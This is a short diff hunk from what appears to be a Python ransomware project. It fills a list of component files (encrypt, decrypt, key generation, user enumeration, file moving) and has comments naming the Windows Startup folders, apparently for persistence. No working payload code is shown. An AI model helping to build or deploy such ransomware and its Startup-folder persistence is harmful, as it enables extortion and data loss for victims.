@@ -7,7 +7,7 @@ import os
 # C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 # C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 
-rware_files = [] #list with all the files that make the ware work
+rware_files = ['__init__.py', 'decrypt.py', 'encrypt.py', 'filter_files.py', 'generate_key_s.py', 'get_usrs.py', 'move_files.py', 'window.py' ] #list with all the files that make the ware work
 
 
 def move():
